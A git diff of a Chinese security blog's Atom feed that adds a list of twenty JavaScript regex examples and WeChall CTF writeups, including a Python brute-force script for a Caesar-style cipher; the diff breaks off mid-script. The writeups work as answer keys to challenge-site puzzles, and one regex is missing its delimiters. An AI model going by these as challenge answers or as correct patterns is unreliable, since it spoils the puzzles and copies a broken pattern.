@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-20T16:01:52+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">渗透测试之信息收集</title><link href="http://localhost:4000/2018/08/20/collect_mes/" rel="alternate" type="text/html" title="渗透测试之信息收集" /><published>2018-08-20T00:00:00+08:00</published><updated>2018-08-20T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/20/collect_mes</id><content type="html" xml:base="http://localhost:4000/2018/08/20/collect_mes/">&lt;p&gt;《Web 安全攻防》渗透测试之信息收集&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-22T08:11:30+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">渗透测试之信息收集</title><link href="http://localhost:4000/2018/08/20/collect_mes/" rel="alternate" type="text/html" title="渗透测试之信息收集" /><published>2018-08-20T00:00:00+08:00</published><updated>2018-08-20T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/20/collect_mes</id><content type="html" xml:base="http://localhost:4000/2018/08/20/collect_mes/">&lt;p&gt;《Web 安全攻防》渗透测试之信息收集&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -85,7 +85,7 @@ II &lt;a href=&quot;http://www.tianyancha.com&quot;&gt;天眼查 &lt;/a&gt;&lt;b
   &lt;li&gt;泄露的源代码&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;strong&gt;c. 乌云漏洞列表&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;c. &lt;a href=&quot;https://bugs.shuimugan.com/&quot;&gt;乌云漏洞列表&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;查询历史漏洞信息&lt;/p&gt;
 
@@ -501,8 +501,185 @@ II &lt;a href=&quot;http://www.tianyancha.com&quot;&gt;天眼查 &lt;/a&gt;&lt;b
 &lt;h2 id=&quot;8社会工程学&quot;&gt;8.社会工程学&lt;/h2&gt;
 
 &lt;p&gt;&lt;strong&gt;社工库&lt;/strong&gt;&lt;br /&gt;
-&lt;strong&gt;域劫持&lt;/strong&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="信息收集" /><summary type="html">《Web 安全攻防》渗透测试之信息收集</summary></entry><entry><title type="html">正则表达式基础(来自 github)</title><link href="http://localhost:4000/2018/08/20/regex/" rel="alternate" type="text/html" title="正则表达式基础(来自 github)" /><published>2018-08-20T00:00:00+08:00</published><updated>2018-08-20T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/20/regex</id><content type="html" xml:base="http://localhost:4000/2018/08/20/regex/">&lt;p&gt;来自 github 上的正则表达式基础，特别好，一定要搞熟。&lt;a href=&quot;https://github.com/zeeshanu/learn-regex/blob/master/README-cn.md&quot;&gt;原文链接&lt;/a&gt;&lt;br /&gt;
-还有一篇&lt;a href=&quot;https://deerchao.net/tutorials/regex/regex.htm&quot;&gt;正则表达式30分钟入门教程&lt;/a&gt;&lt;/p&gt;
+&lt;strong&gt;域劫持&lt;/strong&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="信息收集" /><summary type="html">《Web 安全攻防》渗透测试之信息收集</summary></entry><entry><title type="html">正则表达式实例</title><link href="http://localhost:4000/2018/08/20/regex_exp/" rel="alternate" type="text/html" title="正则表达式实例" /><published>2018-08-20T00:00:00+08:00</published><updated>2018-08-20T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/20/regex_exp</id><content type="html" xml:base="http://localhost:4000/2018/08/20/regex_exp/">&lt;p&gt;这里主要就整理记录一下经常使用的正则表达式，后续如果有遇到一些新鲜的玩法会再来完善。&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;strong&gt;1.请使用正则取出：Tech,Sales,内容1,内容2&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = 'Tech,Sales,内容1,内容2';
+regExp = /Tech|Sales|内容1|内容2/g;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2.&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;OPTION value=&quot;待处理&quot;&amp;gt;待处理&amp;lt;/OPTION&amp;gt;&lt;/code&gt;写一个正则表达式,匹配 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;OPTION value=&quot;待处理&quot;&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = &quot;&amp;lt;OPTION value=&quot;待处理&quot;&amp;gt;待处理&amp;lt;/OPTION&amp;gt;&quot;;
+regExp = /^&amp;lt;.*?&amp;gt;/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3.如何获取一个字符串中的数字字符，并按数组形式输出，如 &lt;code class=&quot;highlighter-rouge&quot;&gt;dgfhfgh254bhku289fgdhdy675gfh&lt;/code&gt; 输出[254,289,675]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = 'dgfhfgh254bhku289fgdhdy675gfh';
+regExp = /\d+/g;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4.从一个字符串中提取链接地址&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = 'IT面试题博客中包含很多  &amp;lt;a href=&quot;http://hi.baidu.com/mianshiti/blog/category/微软面试题&quot;&amp;gt;微软面试题&amp;lt;/a&amp;gt;';
+regExp = /&amp;lt;a(?: [^&amp;gt;]*)+href=&quot;(.*)&quot;(?: [^&amp;gt;]*)*&amp;gt;/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;5.判断连续重复字母&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str1 = 'abc3d4e5'; //False
+str2 = 'aab2c3'; //True
+regExp = /([a-zA-Z])\1/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;6.给定字符串 str，检查其是否包含 3 个连续的数字&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = 'abc123efg';
+regExp = /\d{3}/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;7.&lt;/strong&gt;&lt;br /&gt;
+判断是否符合指定格式；&lt;br /&gt;
+给定字符串 str，检查其是否符合如下格式&lt;br /&gt;
+1)、XXX-XXX-XXXX&lt;br /&gt;
+2)、其中 X 为 Number 类型&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '123-456-7890';
+regExp =  /^(\d{3}-){2}\d{4}$/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;8.判断是否符合 USD 格式：&lt;/strong&gt;&lt;br /&gt;
+给定字符串 str，检查其是否符合美元书写格式&lt;br /&gt;
+1)、以 &lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; 开始&lt;br /&gt;
+2)、整数部分，从个位起，满 3 个数字用 , 分隔&lt;br /&gt;
+3)、如果为小数，则小数部分长度为 2&lt;br /&gt;
+4)、正确的格式如：&lt;code class=&quot;highlighter-rouge&quot;&gt;$1,023,032.03&lt;/code&gt; 或者 &lt;code class=&quot;highlighter-rouge&quot;&gt;$2.03&lt;/code&gt;，错误的格式如：&lt;code class=&quot;highlighter-rouge&quot;&gt;$3,432,12.12&lt;/code&gt; 或者 &lt;code class=&quot;highlighter-rouge&quot;&gt;$34,344.3&lt;/code&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;regExp = /^\$\d{1,3}(,\d{3})*(\.\d{2})?$/;
+str1 = '$1.23'; //true
+str2 = '$111.23'; //true 
+str3 = '$1111.23'; //false
+str4 = '$1,123.23'; //true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;9.判断电话号码&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = &quot;17589122256&quot;
+regExp = /^1[34578]\d{9}$/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;10.验证邮箱&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = &quot;12345678@qq.com&quot;;
+regExp = ^([a-zA-Z0-9_\-])+@([a-zA-Z0-9_\-])+\.([a-zA-Z0-9_\-])+$;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;11.验证身份证号码&lt;/strong&gt;&lt;br /&gt;
+身份证号码可能为15位或18位，15位为全数字，18位中前17位为数字，最后一位为数字或者X&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '123456789123456789';
+regExp = /(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;12.匹配汉字&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '你好世界';
+regExp = /^[\u4e00-\u9fa5]{0,5}$/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;13.判断日期格式是否符合 ‘2017-05-11’的形式，简单判断，只判断格式&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '2017-05-11';
+regExp = /^\d{4}\-\d{1,2}\-\d{1,2}$/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;14.IPv4地址正则&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '192.168.10.1';
+regExp = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;15.十六进制颜色正则&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '#feb';
+regExp = /^#?([a-fA-F0-9]{6}|[a-fA-F0-9]{3})$/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;16.车牌号正则&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '皖A66666';
+regExp = /^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领A-Z]{1}[A-Z]{1}[A-Z0-9]{4}[A-Z0-9挂学警港澳]{1}$/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;17.过滤HTML标签&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '&amp;lt;p&amp;gt;dasdsa&amp;lt;/p&amp;gt;nice &amp;lt;br&amp;gt; test&amp;lt;/br&amp;gt;';
+regExp = /&amp;lt;[^&amp;lt;&amp;gt;]+&amp;gt;/g;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;18.密码强度正则，最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '123456Aa#';
+regExp = /^.*(?=.{6,})(?=.*\d)(?=.*[A-Z])(?=.*[a-z])(?=.*[!@#$%^&amp;amp;*? ]).*$/;
+//这里主要就是利用前置约束存在，保证我后面必须要满足几个小括号里的条件
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;19.URL正则&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = 'https://pengyang.me';
+regExp = /^((https?|ftp|file):\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;20.匹配浮点数&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;str = '100.10';
+regExp = /^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$/;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Catcher</name></author><category term="regex" /><summary type="html">这里主要就整理记录一下经常使用的正则表达式，后续如果有遇到一些新鲜的玩法会再来完善。</summary></entry><entry><title type="html">正则表达式基础(来自 github)</title><link href="http://localhost:4000/2018/08/20/regex/" rel="alternate" type="text/html" title="正则表达式基础(来自 github)" /><published>2018-08-20T00:00:00+08:00</published><updated>2018-08-20T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/20/regex</id><content type="html" xml:base="http://localhost:4000/2018/08/20/regex/">&lt;p&gt;来自 github 上的正则表达式基础，特别好，一定要搞熟。&lt;a href=&quot;https://github.com/zeeshanu/learn-regex/blob/master/README-cn.md&quot;&gt;原文链接&lt;/a&gt;&lt;br /&gt;
+还有几篇特别好的:&lt;br /&gt;
+&lt;a href=&quot;https://deerchao.net/tutorials/regex/regex.htm&quot;&gt;正则表达式30分钟入门教程&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27653434&quot;&gt;JS 正则表达式&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.jb51.net/shouce/jquery1.82/regexp.html&quot;&gt;正则表达式速查表&lt;/a&gt;&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -1158,7 +1335,7 @@ II &lt;a href=&quot;http://www.tianyancha.com&quot;&gt;天眼查 &lt;/a&gt;&lt;b
 
 &lt;h2 id=&quot;许可证&quot;&gt;许可证&lt;/h2&gt;
 
-&lt;p&gt;MIT © &lt;a href=&quot;mailto:ziishaned@gmail.com&quot;&gt;Zeeshan Ahmed&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="regex" /><summary type="html">来自 github 上的正则表达式基础，特别好，一定要搞熟。原文链接 还有一篇正则表达式30分钟入门教程</summary></entry><entry><title type="html">wechall writeup</title><link href="http://localhost:4000/2018/08/19/wechall/" rel="alternate" type="text/html" title="wechall writeup" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/wechall</id><content type="html" xml:base="http://localhost:4000/2018/08/19/wechall/">&lt;p&gt;国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……&lt;/p&gt;
+&lt;p&gt;MIT © &lt;a href=&quot;mailto:ziishaned@gmail.com&quot;&gt;Zeeshan Ahmed&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="regex" /><summary type="html">来自 github 上的正则表达式基础，特别好，一定要搞熟。原文链接 还有几篇特别好的: 正则表达式30分钟入门教程 JS 正则表达式 正则表达式速查表</summary></entry><entry><title type="html">wechall writeup</title><link href="http://localhost:4000/2018/08/19/wechall/" rel="alternate" type="text/html" title="wechall writeup" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/wechall</id><content type="html" xml:base="http://localhost:4000/2018/08/19/wechall/">&lt;p&gt;国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -1265,7 +1442,55 @@ II &lt;a href=&quot;http://www.tianyancha.com&quot;&gt;天眼查 &lt;/a&gt;&lt;b
 
 &lt;p&gt;到这里来&lt;a href=&quot;https://www.dcode.fr/transposition-cipher&quot;&gt;https://www.dcode.fr/transposition-cipher&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;BY KNOWING THE KEY LENGTH =&amp;gt; 选择 4&lt;/p&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……</summary></entry><entry><title type="html">NCTF 综合题2</title><link href="http://localhost:4000/2018/08/19/nctfzh2/" rel="alternate" type="text/html" title="NCTF 综合题2" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/nctfzh2</id><content type="html" xml:base="http://localhost:4000/2018/08/19/nctfzh2/">&lt;p&gt;nctf 上的一道题目，需要挺多技巧的，感觉不错，所以单独拿出来分析一下。
+&lt;p&gt;BY KNOWING THE KEY LENGTH =&amp;gt; 选择 4&lt;/p&gt;
+
+&lt;h2 id=&quot;14training-crypto---substitution-i&quot;&gt;14.Training: Crypto - Substitution I&lt;/h2&gt;
+
+&lt;p&gt;单表替换密码: &lt;a href=&quot;https://quipqiup.com/&quot;&gt;https://quipqiup.com/&lt;/a&gt; 答案要转小写&lt;/p&gt;
+
+&lt;h2 id=&quot;15training-crypto---caesar-ii&quot;&gt;15.Training: Crypto - Caesar II&lt;/h2&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+6C 14 14 09 20 0F 14 07 51 20 1E 14 1A 20 18 14
+11 1B 0A 09 20 14 13 0A 20 12 14 17 0A 20 08 0D
+06 11 11 0A 13 0C 0A 20 0E 13 20 1E 14 1A 17 20
+0F 14 1A 17 13 0A 1E 53 20 79 0D 0E 18 20 14 13
+0A 20 1C 06 18 20 0B 06 0E 17 11 1E 20 0A 06 18
+1E 20 19 14 20 08 17 06 08 10 53 20 7C 06 18 13
+4C 19 20 0E 19 64 20 56 57 5D 20 10 0A 1E 18 20
+0E 18 20 06 20 16 1A 0E 19 0A 20 18 12 06 11 11
+20 10 0A 1E 18 15 06 08 0A 51 20 18 14 20 0E 19
+20 18 0D 14 1A 11 09 13 4C 19 20 0D 06 1B 0A 20
+19 06 10 0A 13 20 1E 14 1A 20 19 14 14 20 11 14
+13 0C 20 19 14 20 09 0A 08 17 1E 15 19 20 19 0D
+0E 18 20 12 0A 18 18 06 0C 0A 53 20 7C 0A 11 11
+20 09 14 13 0A 51 20 1E 14 1A 17 20 18 14 11 1A
+19 0E 14 13 20 0E 18 20 0B 12 14 17 11 18 14 13
+09 0B 0A 13 53
+&quot;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 26-128&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;129&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;	
